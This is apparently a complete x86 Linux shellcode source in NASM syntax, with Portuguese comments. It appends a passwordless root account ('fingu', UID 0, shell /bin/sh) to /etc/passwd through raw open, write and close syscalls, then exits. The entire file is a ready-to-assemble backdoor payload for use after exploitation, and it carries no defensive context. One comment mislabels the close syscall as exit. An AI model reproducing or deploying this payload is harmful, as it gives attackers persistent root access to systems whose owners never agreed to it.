BITS 32
jmp short       __end

__start:

 pop            esi			; carrega 'variaveis' em esi
 xor            eax, eax		; eax = 0
 mov byte       [esi + 11], al		; caracter $ da string = 0
 mov byte       [esi + 32], al		; caracater esi + 32 = 0
 lea            ebx, [esi + 12]		; ebx = endereco de fingu::0...
 mov long       [esi + 33], ebx		; coloca endereco em EEEE

; open (arquivo, 1026);
 mov byte       al, 0x5			; al = 5, syscall open
 lea            ebx, [esi]		; ebx = /etc/passwd 
 mov            cx, 1026		; modo de abertura 
 int            0x80			; faca algo!

; write(fd, string, len);
 mov long       ebx, eax		; ebx = file descriptor do arquivo
 mov            al, 4			; al = 4 syscall write
 mov            ecx, [esi + 33]		; ecx = endereco da string
 xor            edx, edx		; edx = 0
 add            dx, 20			; edx = 20
 int            0x80		

; close(fd);
 mov            al, 6			; al = 6 syscall exit
 int            0x80			; ebx ja contem o file descriptor

; exit(0);
 mov            al, 0x01		; nao vou explicar denovo
 xor            ebx, ebx		; a funcao exit
 int            0x80			; duh!

__end:
call            __start

db              '/etc/passwd$'
db              'fingu::0:0:::/bin/sh$'
db              'EEEE'